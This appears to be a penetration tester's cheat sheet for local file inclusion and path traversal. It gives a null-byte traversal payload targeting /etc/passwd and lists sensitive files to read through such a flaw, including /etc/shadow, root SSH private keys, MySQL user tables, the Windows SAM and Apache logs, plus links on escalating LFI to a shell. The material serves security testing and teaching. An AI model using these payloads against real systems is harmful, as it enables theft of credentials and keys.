<https://evi1us3r.wordpress.com/lfi-cheat-sheet/>
<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal>
<https://highon.coffee/blog/lfi-cheat-sheet/>
<https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf>

LFI Cheat Sheet  
**Useful LFI files**
../../../../../etc/passwd%00
 
**Linux:**
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/authorized_keys
/home/user/.ssh/id_rsa
 
**Apache:**
Configuration Files:
/etc/apache2/apache2.conf
/usr/local/etc/apache2/httpd.conf
/etc/httpd/conf/httpd.conf
 
**Log** **Files**:
Red Hat/CentOS/Fedora Linux-   /var/log/httpd/access_log
Debian/Ubuntu-   /var/log/apache2/access.log
FreeBSD-   /var/log/httpd-access.log
 
**Generic**:
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/apache2/access.log
/var/log/apache/error.log
 
**MySql:**
/var/lib/mysql/mysql/user.frm
/var/lib/mysql/mysql/user.MYD
/var/lib/mysql/mysql/user.MYI
 
**Windows:**
/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/SAM
/windows/panther/unattended.xml
/windows/panther/unattend/unattended.xml

  Local File Inclusion/Remote File Inclusion (LFI/RFI) 
-  <http://www.grobinson.me/single-line-php-script-to-gain-shell/>
- <https://webshell.co/>
- <https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf>
- <https://osandamalith.com/2015/03/29/lfi-freak/>
- <https://wiki.apache.org/httpd/DistrosDefaultLayout#Debian.2C_Ubuntu_.28Apache_httpd_2.x.29>
- <https://roguecod3r.wordpress.com/2014/03/17/lfi-to-shell-exploiting-apache-access-log/>
- <https://attackerkb.com/Windows/blind_files>
- <https://digi.ninja/blog/when_all_you_can_do_is_read.php>
- <https://updatedlinux.wordpress.com/2011/05/12/list-of-important-files-and-directories-in-linux-redhatcentosfedora/>
- <https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/>
- <https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI_InterestingFiles-NullByteAdded.txt> 
- <http://www.r00tsec.com/2014/04/useful-list-file-for-local-file.html> 
- <https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/> 
- <https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt> 